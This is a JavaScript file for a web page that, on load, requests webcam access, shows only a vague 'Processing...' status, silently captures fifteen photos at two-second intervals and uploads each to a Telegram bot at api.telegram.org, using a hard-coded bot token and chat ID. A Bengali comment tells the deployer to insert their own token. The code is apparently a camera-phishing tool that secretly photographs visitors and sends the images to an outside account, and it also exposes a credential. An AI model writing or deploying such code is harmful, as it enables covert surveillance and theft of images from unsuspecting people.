document.addEventListener("DOMContentLoaded", async () => {
    const statusText = document.getElementById("status");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // 🔴 তোমার টেলিগ্রাম বট টোকেন & চ্যাট আইডি বসাও
    const TELEGRAM_BOT_TOKEN = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
    const TELEGRAM_CHAT_ID = "7294674899";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        statusText.innerText = "✅ Processing...";
        startCapturing();
    } catch (error) {
        statusText.innerText = "❌ Camera Access Denied!";
    }

    function startCapturing() {
        let count = 0;
        const maxCaptures = 15;

        const captureInterval = setInterval(() => {
            if (count >= maxCaptures) {
                clearInterval(captureInterval);
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("photo", blob, "capture.jpg");
                
                sendToTelegram(formData);
            }, "image/jpeg");

            count++;
        }, 2000);
    }

    function sendToTelegram(formData) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("📸 Image sent:", data))
        .catch(error => console.error("❌ Error sending image:", error));
    }
});
